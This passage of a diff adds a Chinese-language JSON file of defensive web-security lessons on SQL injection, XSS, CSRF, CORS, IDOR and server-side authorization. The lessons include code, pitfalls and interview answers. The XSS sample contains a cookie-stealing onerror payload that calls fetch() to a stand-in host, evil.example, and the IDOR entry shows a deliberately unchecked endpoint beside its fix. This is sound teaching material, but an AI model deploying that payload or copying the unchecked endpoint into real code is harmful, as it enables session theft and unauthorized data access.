+    "bad": "数据库报错信息直接返回给用户",
+    "fix": "对外返回通用错误，详细信息只写日志"
+   }
+  ],
+  "checklist": [
+   "所有查询使用参数绑定",
+   "动态标识符走白名单",
+   "应用数据库账号最小权限",
+   "错误信息不泄露 SQL 细节",
+   "CI 中有 SAST 扫描",
+   "安全测试包含注入用例"
+  ],
+  "interview": [
+   {
+    "q": "为什么参数化能根本防御 SQL 注入？",
+    "a": "参数化把 SQL 语句结构和数据分开传给数据库：结构先被解析确定，参数只能作为值填入，无论内容包含什么引号或关键字，都无法改变语句的语法结构。转义则是试图让数据“看起来不像代码”，容易遗漏。"
+   },
+   {
+    "q": "哪些地方不能参数化，怎么处理？",
+    "a": "表名、列名、排序方向、LIMIT 在部分驱动中等 SQL 标识符和关键字通常不能用占位符。正确做法是用白名单把用户选择映射到固定的合法值，绝不直接拼接原始输入。"
+   },
+   {
+    "q": "什么是二阶 SQL 注入？",
+    "a": "恶意输入第一次写入时被安全地参数化保存，没有触发；但之后另一段代码从数据库读出这个值，信任它并拼接进新的 SQL，此时才触发注入。防御原则是任何来源的数据进入 SQL 时都参数化，包括来自自己数据库的数据。"
+   }
+  ],
+  "refs": [
+   {
+    "title": "OWASP: SQL Injection",
+    "url": "https://owasp.org/www-community/attacks/SQL_Injection"
+   },
+   {
+    "title": "OWASP SQL Injection Prevention Cheat Sheet",
+    "url": "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html"
+   },
+   {
+    "title": "CWE-89: SQL Injection",
+    "url": "https://cwe.mitre.org/data/definitions/89.html"
+   }
+  ]
+ },
+ {
+  "slug": "xss",
+  "def": "跨站脚本攻击（Cross-Site Scripting，XSS）是攻击者把恶意脚本注入到受信任网站的页面中，使其在其他用户浏览器里以该网站身份执行的漏洞。它属于 Web 前端注入类风险，可窃取会话、伪造操作、篡改页面。按触发方式分为存储型、反射型和 DOM 型。根本防御是按输出上下文编码。",
+  "how": [
+   "攻击者找到会把输入渲染到页面的位置，如评论、搜索词回显、URL 参数。",
+   "提交包含脚本的输入，如带 onerror 事件的 img 标签或 javascript: 链接。",
+   "应用未按上下文编码就把输入插入 HTML、属性、URL 或 JavaScript 中。",
+   "受害者打开页面，浏览器把注入内容解析为代码并以该站点源（Origin）的权限执行。",
+   "脚本可读取页面数据、调用同源接口、读取非 HttpOnly Cookie 或把数据发往攻击者服务器。"
+  ],
+  "terms": [
+   {
+    "t": "存储型 XSS (Stored)",
+    "d": "恶意内容被保存到服务端，所有访问者都会触发。"
+   },
+   {
+    "t": "反射型 XSS (Reflected)",
+    "d": "恶意内容在请求参数中，服务器直接回显到响应。"
+   },
+   {
+    "t": "DOM 型 XSS",
+    "d": "前端 JS 把不可信数据写入危险 DOM 接口导致执行。"
+   },
+   {
+    "t": "输出编码 (Output Encoding)",
+    "d": "按 HTML、属性、URL 等上下文转义特殊字符。"
+   },
+   {
+    "t": "CSP (内容安全策略)",
+    "d": "通过响应头限制脚本来源，作为纵深防御。"
+   }
+  ],
+  "code": {
+   "lang": "javascript",
+   "title": "危险写法与安全写法",
+   "src": "const comment = '<img src=x onerror=\"fetch(`https://evil.example/?c=${document.cookie}`)\">';\n\n// 危险：把不可信内容当 HTML 解析\nel.innerHTML = comment;\n\n// 安全：作为纯文本插入，浏览器不会解析标签\nel.textContent = comment;\n\n// 确需渲染富文本：用 DOMPurify 清洗后再插入\nimport DOMPurify from \"dompurify\";\nel.innerHTML = DOMPurify.sanitize(userHtml);\n\n// URL 也是危险上下文：只允许 http/https 协议\nconst url = new URL(userLink, location.origin);\nif ([\"http:\", \"https:\"].includes(url.protocol)) a.href = url.href;\n\n// React 默认转义 {comment}；dangerouslySetInnerHTML 等同 innerHTML\n// <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(html) }} />",
+   "note": "textContent 与框架默认转义是首选；富文本必须先清洗；链接需校验协议。"
+  },
+  "table": {
+   "title": "输出上下文与处理",
+   "head": [
+    "上下文",
+    "示例位置",
+    "正确处理"
+   ],
+   "rows": [
+    [
+     "HTML 正文",
+     "<div>这里</div>",
+     "HTML 实体编码或 textContent"
+    ],
+    [
+     "HTML 属性",
+     "title=\"这里\"",
+     "属性编码并始终加引号"
+    ],
+    [
+     "URL",
+     "href=\"这里\"",
+     "校验协议并 URL 编码"
+    ],
+    [
+     "JavaScript",
+     "<script>中的变量",
+     "避免插入；必须时 JSON 序列化并转义"
+    ]
+   ]
+  },
+  "tradeoffs": [
+   {
+    "opt": "框架自动转义",
+    "pros": "默认安全，零成本",
+    "cons": "绕过 API 时失效",
+    "when": "所有前端项目的基础"
+   },
+   {
+    "opt": "HTML 清洗库",
+    "pros": "允许安全的富文本",
+    "cons": "需保持库更新",
+    "when": "评论、富文本编辑器"
+   },
+   {
+    "opt": "严格 CSP",
+    "pros": "漏洞存在时也能限制危害",
+    "cons": "改造内联脚本成本高",
+    "when": "纵深防御、高安全要求"
+   }
+  ],
+  "pitfalls": [
+   {
+    "bad": "在输入时过滤 <script> 就以为安全",
+    "fix": "在输出时按上下文编码，事件属性等同样危险"
+   },
+   {
+    "bad": "React 中随意用 dangerouslySetInnerHTML",
+    "fix": "必须先用 DOMPurify 清洗，或改为普通渲染"
+   },
+   {
+    "bad": "把模型生成的 Markdown 直接渲染为 HTML",
+    "fix": "LLM 输出视为不可信，渲染时禁用原始 HTML 并清洗"
+   },
+   {
+    "bad": "href 未校验，放行 javascript: 协议",
+    "fix": "只允许 http/https 等白名单协议"
+   }
+  ],
+  "checklist": [
+   "禁止或审查 innerHTML 类接口",
+   "富文本经清洗库处理",
+   "链接校验协议",
+   "会话 Cookie 设置 HttpOnly",
+   "部署 CSP 并监控违规报告",
+   "AI 输出渲染前做转义或清洗"
+  ],
+  "interview": [
+   {
+    "q": "为什么说 XSS 防御的核心是输出编码？",
+    "a": "同一份数据在 HTML 正文、属性、URL、JavaScript 中的危险字符各不相同，输入时无法预知会输出到哪里。只有在输出时根据具体上下文做对应编码，才能保证数据始终被当作数据。输入校验只能作为补充。"
+   },
+   {
+    "q": "HttpOnly 能防止 XSS 吗？",
+    "a": "不能防止 XSS 本身，只能阻止脚本读取会话 Cookie。攻击脚本仍能在页面内以用户身份发起同源请求、读取页面内容、修改界面诱导用户输入。它是降低危害的措施，不是修复漏洞的方法。"
+   },
+   {
+    "q": "CSP 怎样缓解 XSS？",
+    "a": "CSP 通过响应头声明允许执行的脚本来源，严格策略会禁止内联脚本和 eval，并使用 nonce 或 hash 只放行可信脚本。即便存在注入点，注入的脚本也因不被允许而无法执行，是有效的纵深防御。"
+   }
+  ],
+  "refs": [
+   {
+    "title": "OWASP: Cross Site Scripting (XSS)",
+    "url": "https://owasp.org/www-community/attacks/xss/"
+   },
+   {
+    "title": "OWASP XSS Prevention Cheat Sheet",
+    "url": "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
+   },
+   {
+    "title": "MDN: Content Security Policy (CSP)",
+    "url": "https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP"
+   },
+   {
+    "title": "DOMPurify (GitHub)",
+    "url": "https://github.com/cure53/DOMPurify"
+   }
+  ]
+ },
+ {
+  "slug": "csrf",
+  "def": "跨站请求伪造（Cross-Site Request Forgery，CSRF）是恶意网站诱导已登录用户的浏览器向目标站点发送请求，借助浏览器自动携带的 Cookie 以用户身份执行非本意操作的攻击。它针对依赖 Cookie 等环境凭证认证的状态变更接口，攻击者通常看不到响应，只求操作生效。",
+  "how": [
+   "用户已登录目标站点，浏览器中保存着该站点的会话 Cookie。",
+   "用户访问攻击者页面，页面通过自动提交的表单、图片或脚本向目标站点发起请求。",
+   "浏览器按规则自动附加目标站点的 Cookie，服务器无法仅凭 Cookie 区分请求是否出自用户本意。",
+   "若接口只校验会话而不验证请求来源，就会执行转账、改邮箱等状态变更操作。",
+   "防御方案让请求必须携带攻击者无法获取或伪造的信息，或拒绝跨站来源的请求。"
+  ],
+  "terms": [
+   {
+    "t": "环境凭证 (Ambient Credential)",
+    "d": "浏览器自动附带的凭证，如 Cookie、HTTP Basic 认证。"
+   },
+   {
+    "t": "同步令牌模式 (Synchronizer Token)",
+    "d": "服务端生成随机令牌嵌入表单，提交时校验。"
+   },
+   {
+    "t": "双重提交 Cookie (Double Submit)",
+    "d": "令牌同时放在 Cookie 和请求参数中比对，推荐签名版本。"
+   },
+   {
+    "t": "Origin 头",
+    "d": "浏览器在跨源和 POST 请求中附带的请求来源，可用于校验。"
+   },
+   {
+    "t": "Fetch Metadata",
+    "d": "Sec-Fetch-Site 等请求头，标明请求是否跨站。"
+   }
+  ],
+  "code": {
+   "lang": "python",
+   "title": "Flask 同步令牌防护",
+   "src": "import secrets, hmac\nfrom flask import Flask, session, request, abort\n\napp = Flask(__name__)\napp.secret_key = \"replace-with-env-secret\"   # 实际从环境变量读取\n\n@app.get(\"/settings\")\ndef settings_form():\n    session.setdefault(\"csrf\", secrets.token_urlsafe(32))\n    return f'''<form method=\"post\" action=\"/settings/email\">\n      <input type=\"hidden\" name=\"csrf\" value=\"{session['csrf']}\">\n      <input name=\"email\"><button>保存</button></form>'''\n\n@app.post(\"/settings/email\")\ndef change_email():\n    token = request.form.get(\"csrf\", \"\")\n    # 恒定时间比较，攻击者页面无法读取这个令牌\n    if not hmac.compare_digest(token, session.get(\"csrf\", \"\")):\n        abort(403)\n    # ... 更新邮箱\n    return \"ok\"",
+   "note": "演示原理；生产中优先使用框架内置 CSRF 中间件，如 Flask-WTF、Django CSRF。"
+  },
+  "table": {
+   "title": "CSRF 防御手段",
+   "head": [
+    "手段",
+    "原理",
+    "注意"
+   ],
+   "rows": [
+    [
+     "CSRF 令牌",
+     "攻击者无法读取随机令牌",
+     "主流且可靠，框架多内置"
+    ],
+    [
+     "SameSite Cookie",
+     "跨站请求不带 Cookie",
+     "Lax 仍允许顶级 GET 导航"
+    ],
+    [
+     "校验 Origin/Sec-Fetch-Site",
+     "拒绝跨站来源",
+     "需处理头缺失情况"
+    ],
+    [
+     "敏感操作二次确认",
+     "要求输入密码或验证码",
+     "影响体验，用于高危操作"
+    ]
+   ]
+  },
+  "tradeoffs": [
+   {
+    "opt": "框架内置 CSRF 令牌",
+    "pros": "成熟可靠",
+    "cons": "SPA 需额外传递令牌",
+    "when": "服务端渲染表单应用"
+   },
+   {
+    "opt": "SameSite + Origin 校验",
+    "pros": "无需令牌，实现轻",
+    "cons": "依赖浏览器行为",
+    "when": "现代浏览器为主的 API"
+   },
+   {
+    "opt": "Authorization 头携带令牌",
+    "pros": "非环境凭证，天然免疫 CSRF",
+    "cons": "令牌存储易受 XSS 影响",
+    "when": "纯 API 与移动端"
+   }
+  ],
+  "pitfalls": [
+   {
+    "bad": "用 GET 请求执行状态变更",
+    "fix": "状态变更只用 POST/PUT/DELETE，GET 保持安全无副作用"
+   },
+   {
+    "bad": "只依赖 SameSite 不做其他防护",
+    "fix": "配合 CSRF 令牌或 Origin 校验作为纵深防御"
+   },
+   {
+    "bad": "CSRF 令牌放在 URL 中",
+    "fix": "放在请求体或自定义头，避免经 Referer 和日志泄露"
+   },
+   {
+    "bad": "存在 XSS 时仍以为 CSRF 令牌有效",
+    "fix": "XSS 可读取令牌，必须先修复 XSS"
+   }
+  ],
+  "checklist": [
+   "GET 请求无副作用",
+   "状态变更接口有 CSRF 防护",
+   "会话 Cookie 设置 SameSite",
+   "令牌比较使用恒定时间",
+   "登录与登出接口同样防护",
+   "高危操作需要再次认证"
+  ],
+  "interview": [
+   {
+    "q": "CSRF 和 XSS 有什么区别？",
+    "a": "XSS 是在目标站点执行攻击者脚本，脚本能读写页面和发任意同源请求；CSRF 是在攻击者站点构造请求，借用户浏览器自动带的凭证让目标站点执行操作，通常读不到响应。存在 XSS 时，CSRF 防御基本失效。"
+   },
+   {
+    "q": "用 Bearer Token 的 API 还需要防 CSRF 吗？",
+    "a": "如果令牌放在 Authorization 头中由前端代码显式添加，浏览器不会自动携带，跨站页面无法读取它，因此天然不受 CSRF 影响。但若令牌放在 Cookie 中，就重新变成环境凭证，需要 CSRF 防护。"
+   },
+   {
+    "q": "为什么 CORS 不能防 CSRF？",
+    "a": "CORS 控制的是跨源脚本能否读取响应，而不是能否发送请求。简单请求（如表单 POST）不触发预检，会直接发到服务器并执行，只是攻击者读不到结果。CSRF 只需要请求被执行，因此 CORS 不能替代 CSRF 防护。"
+   }
+  ],
+  "refs": [
+   {
+    "title": "OWASP CSRF Prevention Cheat Sheet",
+    "url": "https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html"
+   },
+   {
+    "title": "MDN: Cross-site request forgery (CSRF)",
+    "url": "https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/CSRF"
+   },
+   {
+    "title": "web.dev: Protect your resources with Fetch Metadata",
+    "url": "https://web.dev/articles/fetch-metadata"
+   }
+  ]
+ },
+ {
+  "slug": "cors",
+  "def": "跨源资源共享（Cross-Origin Resource Sharing，CORS）是浏览器在同源策略基础上、允许服务器通过 HTTP 响应头声明哪些其他源可以读取其资源的机制，由 WHATWG Fetch 标准定义。它是浏览器端的放行协议而非服务端访问控制，只约束浏览器脚本能否读取响应，对 curl 无效。",
+  "how": [
+   "浏览器判断请求是否跨源：协议、域名、端口任一不同即为跨源，并在请求中附带 Origin 头。",
+   "简单请求（特定方法与头）直接发送，浏览器检查响应中的 Access-Control-Allow-Origin 决定是否交给脚本。",
+   "非简单请求（如 PUT、带自定义头或 JSON 类型）先发 OPTIONS 预检，询问允许的方法和头。",
+   "服务器返回 Allow-Methods、Allow-Headers、Max-Age 等，预检通过后浏览器才发送真实请求。",
+   "携带 Cookie 需前端设置 credentials，服务器返回 Allow-Credentials: true 且 Allow-Origin 不能为 *。"
+  ],
+  "terms": [
+   {
+    "t": "同源策略 (Same-Origin Policy)",
+    "d": "浏览器限制脚本读取其他源资源的基础安全模型。"
+   },
+   {
+    "t": "源 (Origin)",
+    "d": "协议 + 主机 + 端口的组合，三者相同才算同源。"
+   },
+   {
+    "t": "预检请求 (Preflight)",
+    "d": "浏览器自动发送的 OPTIONS 请求，确认是否允许实际请求。"
+   },
+   {
+    "t": "带凭证请求 (Credentialed Request)",
+    "d": "携带 Cookie 或 HTTP 认证信息的跨源请求。"
+   },
+   {
+    "t": "Vary: Origin",
+    "d": "提示缓存按 Origin 区分响应，动态返回 Allow-Origin 时需要。"
+   }
+  ],
+  "code": {
+   "lang": "javascript",
+   "title": "Express 白名单式 CORS",
+   "src": "import express from \"express\";\nimport cors from \"cors\";\n\nconst app = express();\nconst allowlist = new Set([\n  \"https://app.example.com\",\n  \"http://localhost:5173\",     // 本地开发\n]);\n\napp.use(cors({\n  origin(origin, cb) {\n    // 无 Origin（如服务器间调用）放行；CORS 本就不约束它们\n    if (!origin || allowlist.has(origin)) return cb(null, true);\n    cb(null, false);            // 不返回 CORS 头，浏览器将拦截读取\n  },\n  credentials: true,            // 允许携带 Cookie，此时不能用 *\n  methods: [\"GET\", \"POST\", \"PUT\", \"DELETE\"],\n  maxAge: 600,                  // 预检结果缓存秒数\n}));\n\napp.get(\"/api/me\", (req, res) => res.json({ ok: true }));\napp.listen(3000);",
+   "note": "使用 cors 中间件按白名单回显 Origin；cors 会自动处理预检与 Vary 头。"
+  },
+  "table": {
+   "title": "关键 CORS 响应头",
+   "head": [
+    "响应头",
+    "作用",
+    "注意"
+   ],
+   "rows": [
+    [
+     "Access-Control-Allow-Origin",
+     "允许读取的源",
+     "带凭证时不能为 *"
+    ],
+    [
+     "Access-Control-Allow-Credentials",
+     "允许携带凭证",
+     "仅能为 true"
+    ],
+    [
+     "Access-Control-Allow-Methods/Headers",
+     "预检允许的方法与头",
+     "只在预检响应中需要"
+    ],
+    [
+     "Access-Control-Max-Age",
+     "预检缓存时长",
+     "浏览器有各自上限"
+    ]
+   ]
+  },
+  "tradeoffs": [
+   {
+    "opt": "精确白名单",
+    "pros": "最安全",
+    "cons": "新增前端域名需改配置",
+    "when": "带登录态的 API"
+   },
+   {
+    "opt": "Allow-Origin: *",
+    "pros": "简单",
+    "cons": "不能带凭证",
+    "when": "完全公开、无需鉴权的数据"
+   },
+   {
+    "opt": "同源反向代理",
+    "pros": "彻底避免跨源",
+    "cons": "多一层代理配置",
+    "when": "前后端可部署在同一域名"
+   }
+  ],
+  "pitfalls": [
+   {
+    "bad": "把请求的 Origin 原样回显并允许凭证",
+    "fix": "只回显白名单中的源"
+   },
+   {
+    "bad": "用正则匹配域名，被 example.com.evil.com 绕过",
+    "fix": "完整精确比对源字符串"
+   },
+   {
+    "bad": "以为配置了 CORS 接口就安全了",
+    "fix": "CORS 不是鉴权，接口仍需认证与授权"
+   },
+   {
+    "bad": "白名单包含 null 源",
+    "fix": "不要信任 null，沙箱 iframe 等可伪造该来源"
+   }
+  ],
+  "checklist": [
+   "Allow-Origin 使用精确白名单",
+   "带凭证接口不使用 *",
+   "动态 Origin 时返回 Vary: Origin",
+   "生产配置不含 localhost",
+   "预检响应正确处理 OPTIONS",
+   "接口本身仍有认证授权"
+  ],
+  "interview": [
+   {
+    "q": "CORS 错误时请求到底发出去了吗？",
+    "a": "要看情况。简单请求已经发到服务器并被处理，只是浏览器拒绝把响应交给脚本；非简单请求在预检失败时，真实请求不会发送。这也是为什么 CORS 不能防御 CSRF：简单请求的副作用已经发生。"
+   },
+   {
+    "q": "为什么带凭证时 Allow-Origin 不能为 *？",
+    "a": "如果允许任意源带着用户 Cookie 读取响应，任何恶意网站都能以用户身份读取私有数据，相当于取消同源策略。因此规范要求带凭证的响应必须明确指定单一源，迫使服务器做出有意识的信任决定。"
+   },
+   {
+    "q": "CORS 是防谁的？",
+    "a": "CORS 保护的是用户：防止用户浏览器中的恶意网站脚本，借用户的登录状态读取其他站点的数据。它并不保护服务器免受非浏览器客户端访问，攻击者用 curl 可以忽略 CORS，因此服务端必须自行鉴权。"
+   }
+  ],
+  "refs": [
+   {
+    "title": "MDN: Cross-Origin Resource Sharing (CORS)",
+    "url": "https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS"
+   },
+   {
+    "title": "Fetch Standard: CORS protocol",
+    "url": "https://fetch.spec.whatwg.org/#http-cors-protocol"
+   },
+   {
+    "title": "PortSwigger: CORS",
+    "url": "https://portswigger.net/web-security/cors"
+   }
+  ]
+ },
+ {
+  "slug": "idor",
+  "def": "不安全的直接对象引用（Insecure Direct Object Reference，IDOR）指用用户可控的 ID 直接访问对象、却不校验当前用户是否有权访问的漏洞。它属于失效的访问控制（Broken Access Control），该类在 OWASP Top 10 2021 中居首，API 安全中称为 BOLA。",
+  "how": [
+   "接口通过 URL、参数或请求体接收对象标识，如 GET /api/invoices/1024。",
+   "服务端完成了认证，确认请求者已登录，但直接按 ID 查询并返回对象。",
+   "攻击者修改标识为他人的值，如 1025，或批量枚举，服务端照常返回。",
+   "同样的缺陷可出现在读取、修改、删除以及文件下载等任何按 ID 操作的接口。",
+   "修复方式是在每次访问时把对象归属或权限与当前用户比对，或在查询中加入归属条件。"
+  ],
+  "terms": [
+   {
+    "t": "BOLA",
+    "d": "对象级授权失效，OWASP API Top 10 第一项，即 API 版 IDOR。"
+   },
+   {
+    "t": "失效的访问控制 (Broken Access Control)",
+    "d": "用户能执行超出其权限的操作的一类漏洞。"
+   },
+   {
+    "t": "水平越权 (Horizontal Escalation)",
+    "d": "访问同级别其他用户的数据。"
+   },
+   {
+    "t": "垂直越权 (Vertical Escalation)",
+    "d": "普通用户执行管理员等更高权限操作。"
+   },
+   {
+    "t": "行级安全 (Row-Level Security)",
+    "d": "数据库按策略限制每个用户可见或可改的行。"
+   }
+  ],
+  "code": {
+   "lang": "python",
+   "title": "按归属查询修复 IDOR",
+   "src": "from fastapi import FastAPI, Depends, HTTPException\n\napp = FastAPI()\n\n# 有漏洞：只按 ID 查，任何登录用户都能看任何发票\n@app.get(\"/v1/invoices/{invoice_id}\")\ndef get_invoice_bad(invoice_id: int, user=Depends(current_user)):\n    return db.query_one(\"SELECT * FROM invoices WHERE id = %s\", (invoice_id,))\n\n# 修复：查询条件中带上归属，不存在与无权统一返回 404\n@app.get(\"/v2/invoices/{invoice_id}\")\ndef get_invoice(invoice_id: int, user=Depends(current_user)):\n    row = db.query_one(\n        \"SELECT * FROM invoices WHERE id = %s AND owner_id = %s\",\n        (invoice_id, user.id),\n    )\n    if row is None:\n        raise HTTPException(status_code=404)\n    return row",
+   "note": "current_user 与 db 为项目自有依赖；关键是授权条件在服务端查询中强制执行。"
+  },
+  "table": {
+   "title": "IDOR 防御层次",
+   "head": [
+    "层次",
+    "做法",
+    "作用"
+   ],
+   "rows": [
+    [
+     "查询层",
+     "WHERE 带 owner_id/tenant_id",
+     "从源头限制可见数据"
+    ],
+    [
+     "授权层",
+     "统一的对象级权限检查函数",
+     "集中、可测试"
+    ],
+    [
+     "数据库层",
+     "行级安全策略 (RLS)",
+     "应用层疏漏时兜底"
+    ],
+    [
+     "标识符",
+     "使用 UUID 等不可猜测 ID",
+     "增加枚举难度，不能替代授权"
+    ]
+   ]
+  },
+  "tradeoffs": [
+   {
+    "opt": "应用层逐接口检查",
+    "pros": "灵活，逻辑清晰",
+    "cons": "易遗漏某个接口",
+    "when": "接口少、规则简单"
+   },
+   {
+    "opt": "数据库行级安全",
+    "pros": "统一兜底，难以绕过",
+    "cons": "调试与性能需关注",
+    "when": "多租户、BaaS 直连数据库"
+   },
+   {
+    "opt": "集中式授权中间件/策略",
+    "pros": "一致且可审计",
+    "cons": "前期设计成本",
+    "when": "中大型系统"
+   }
+  ],
+  "pitfalls": [
+   {
+    "bad": "改用 UUID 就认为修复了 IDOR",
+    "fix": "UUID 可能经日志、分享链接泄露，仍需授权检查"
+   },
+   {
+    "bad": "只检查读取接口，忽略更新和删除",
+    "fix": "所有按 ID 操作的接口都做对象级授权"
+   },
+   {
+    "bad": "信任请求体中的 user_id 字段",
+    "fix": "当前用户身份只从服务端会话或令牌获取"
+   },
+   {
+    "bad": "AI 生成的 CRUD 接口没有归属校验",
+    "fix": "在提示和规则文件中明确要求对象级授权并补测试"
+   }
+  ],
+  "checklist": [
+   "所有按 ID 访问的接口有归属检查",
+   "用户身份只来自服务端会话",
+   "多租户查询带租户条件",
+   "无权与不存在返回一致",
+   "测试中用 A 账号访问 B 的资源",
+   "考虑启用数据库行级安全"
+  ],
+  "interview": [
+   {
+    "q": "IDOR 为什么这么常见？",
+    "a": "认证通常由框架统一处理，开发者容易误以为“已登录就安全”；对象级授权需要每个接口结合业务数据单独判断，难以自动化，且扫描器很难发现，因为它需要理解哪些数据属于谁。AI 生成的 CRUD 代码也常遗漏这一步。"
+   },
+   {
+    "q": "用不可猜测的 ID 能防 IDOR 吗？",
+    "a": "只能增加攻击难度，不能防御。ID 可能通过分享链接、日志、前端响应、Referer 等途径泄露，一旦拿到就能访问。正确做法是每次访问都校验权限，不可猜测 ID 只作为纵深防御。"
+   },
+   {
+    "q": "如何系统地测试 IDOR？",
+    "a": "准备至少两个不同用户（及不同角色、租户）的账号，对每个携带对象 ID 的接口，用 A 的会话请求 B 的对象，覆盖读、改、删和批量接口，断言返回 403 或 404。可以把这类用例写入自动化测试，防止回归。"
+   }
+  ],
+  "refs": [
+   {
+    "title": "OWASP Top 10 2021: A01 Broken Access Control",
+    "url": "https://owasp.org/Top10/A01_2021-Broken_Access_Control/"
+   },
+   {
+    "title": "OWASP API Security Top 10 2023: API1 BOLA",
+    "url": "https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/"
+   },
+   {
+    "title": "OWASP IDOR Prevention Cheat Sheet",
+    "url": "https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html"
+   }
+  ]
+ },
+ {
+  "slug": "server-side-authorization",
+  "def": "服务端授权（Server-Side Authorization）指所有访问控制决策都在服务器或可信后端执行，前端的隐藏按钮、路由守卫只用于体验而不作为安全边界。它基于一个事实：客户端完全由用户控制，任何请求都可以被构造、修改和重放。这是防止越权、IDOR 和权限绕过的基本原则。",
+  "how": [
+   "前端可以根据角色显示或隐藏功能，但这只影响界面，不阻止任何请求。",
+   "每个请求到达服务端后，从可信会话或经校验的令牌中提取身份，不信任请求体中的角色字段。",
+   "服务端在业务处理前执行功能级授权（能否调用此接口）和对象级授权（能否操作此资源）。",
+   "默认拒绝：未显式授权的操作一律禁止，新接口必须声明所需权限。",
+   "使用 BaaS 时，授权落在数据库规则（如 RLS、Security Rules）上，同样由服务端强制执行。"
+  ],
+  "terms": [
+   {
+    "t": "默认拒绝 (Deny by Default)",
+    "d": "除非明确允许，否则拒绝所有访问。"
+   },
+   {
+    "t": "功能级授权 (Function-Level)",
+    "d": "判断用户能否调用某个接口或功能。"
+   },
+   {
+    "t": "对象级授权 (Object-Level)",
+    "d": "判断用户能否访问某个具体数据对象。"
+   },
+   {
+    "t": "批量赋值 (Mass Assignment)",
+    "d": "把请求体字段直接写入模型，可能改到 role 等敏感字段。"
+   },
+   {
+    "t": "策略即代码 (Policy as Code)",
+    "d": "用 OPA 等引擎以代码形式集中管理授权规则。"
+   }
+  ],
+  "code": {
+   "lang": "typescript",
+   "title": "服务端集中授权与字段白名单",
+   "src": "type User = { id: string; role: \"admin\" | \"member\" };\n\n// 集中的授权函数：每个动作的规则写在一处，便于测试\nfunction can(user: User, action: string, post?: { authorId: string }) {\n  switch (action) {\n    case \"post:create\": return true;\n    case \"post:update\": return user.role === \"admin\" || post?.authorId === user.id;\n    case \"user:setRole\": return user.role === \"admin\";\n    default: return false;                       // 默认拒绝\n  }\n}\n\napp.patch(\"/posts/:id\", requireLogin, async (req, res) => {\n  const post = await db.post.findUnique({ where: { id: req.params.id } });\n  if (!post) return res.sendStatus(404);\n  if (!can(req.user, \"post:update\", post)) return res.sendStatus(403);\n\n  // 字段白名单，防止批量赋值改到 authorId 等字段\n  const { title, body } = req.body;\n  await db.post.update({ where: { id: post.id }, data: { title, body } });\n  res.sendStatus(204);\n});",
+   "note": "身份来自 requireLogin 写入的 req.user；授权规则集中且默认拒绝，更新只取白名单字段。"
+  },
+  "table": {
+   "title": "前端控制 vs 服务端控制",
+   "head": [
+    "位置",
+    "作用",
+    "能否作为安全边界"
+   ],
+   "rows": [
+    [
+     "前端隐藏按钮/路由守卫",
+     "改善体验",
+     "不能"
+    ],
+    [
+     "API 网关",
+     "认证、限流、粗粒度规则",
+     "部分"
+    ],
+    [
+     "服务端业务层",
+     "功能级与对象级授权",
+     "能"
+    ],
+    [
+     "数据库 RLS/规则",
+     "数据层兜底",
+     "能"
+    ]
+   ]
+  },
+  "tradeoffs": [
+   {
+    "opt": "代码中手写授权判断",
+    "pros": "直观、灵活",
+    "cons": "分散易漏",
+    "when": "小型应用"
+   },
+   {
+    "opt": "集中授权模块或策略引擎",
+    "pros": "一致、可审计、易测试",
+    "cons": "引入抽象与依赖",
+    "when": "多角色、多团队系统"
+   },
+   {
+    "opt": "数据库层授权（RLS）",
+    "pros": "所有访问路径统一受控",
+    "cons": "复杂规则难表达",
+    "when": "前端直连 BaaS 数据库"
+   }
+  ],
+  "pitfalls": [
+   {
+    "bad": "只在前端判断 isAdmin 后显示管理功能",
+    "fix": "管理接口在服务端校验角色"
+   },
+   {
+    "bad": "从请求体或 JWT 未校验部分读取 role",
+    "fix": "角色来自服务端存储或经签名校验的令牌"
+   },
+   {
+    "bad": "把整个 req.body 传给 ORM 更新",
+    "fix": "显式挑选允许修改的字段"
+   },
+   {
+    "bad": "Supabase 表未启用 RLS 就用 anon key 访问",
+    "fix": "所有暴露的表启用 RLS 并编写策略"
+   }
+  ],
+  "checklist": [
+   "每个接口声明所需权限",
+   "未声明权限的操作默认拒绝",
+   "身份与角色只来自可信来源",
+   "更新操作使用字段白名单",
+   "BaaS 数据表启用访问规则",
+   "越权场景有自动化测试"
+  ],
+  "interview": [
+   {
+    "q": "为什么不能依赖前端做权限控制？",
+    "a": "前端代码运行在用户设备上，用户可以修改 JavaScript、用开发者工具改变量，或绕过界面直接用 curl、Postman 调用 API。前端控制只决定看到什么，服务端才决定能做什么，所以所有授权必须在服务端执行。"
+   },
+   {
+    "q": "什么是批量赋值漏洞？",
+    "a": "框架把请求体字段自动映射到数据模型并保存时，攻击者可以额外提交 role、isAdmin、ownerId 等本不应由用户修改的字段，从而提权或篡改归属。防御方法是使用字段白名单或专门的输入 DTO。"
+   },
+   {
+    "q": "前端直连 Supabase/Firebase 如何做授权？",
+    "a": "此时没有自建后端，数据库规则就是服务端授权：Supabase 需对表启用行级安全并编写基于 auth.uid() 的策略，Firebase 需编写 Security Rules。公开的 anon/客户端密钥不是秘密，安全完全依赖这些规则。"
+   }
+  ],
+  "refs": [
+   {
+    "title": "OWASP Authorization Cheat Sheet",
+    "url": "https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html"
+   },
+   {
+    "title": "OWASP Mass Assignment Cheat Sheet",
+    "url": "https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html"
+   },
+   {
+    "title": "Supabase Docs: Row Level Security",
+    "url": "https://supabase.com/docs/guides/database/postgres/row-level-security"
+   }
+  ]
+ },
+ {
+  "slug": "least-privilege",
+  "def": "最小权限原则（Principle of Least Privilege，PoLP）要求每个用户、服务、进程和 AI Agent 只拥有完成其任务所必需的最小权限，且只在需要的时间内拥有。它是贯穿身份、云资源、数据库、API 密钥和 Agent 工具设计的安全原则，目的是在凭证泄露或组件被攻破时把损失限制在最小范围。",
+  "how": [
+   "梳理主体需要执行的具体操作和访问的资源，而不是按“可能会用到”授予。",
+   "按操作和资源粒度授权，如只读某个存储桶、只能写某张表，避免使用通配符。",
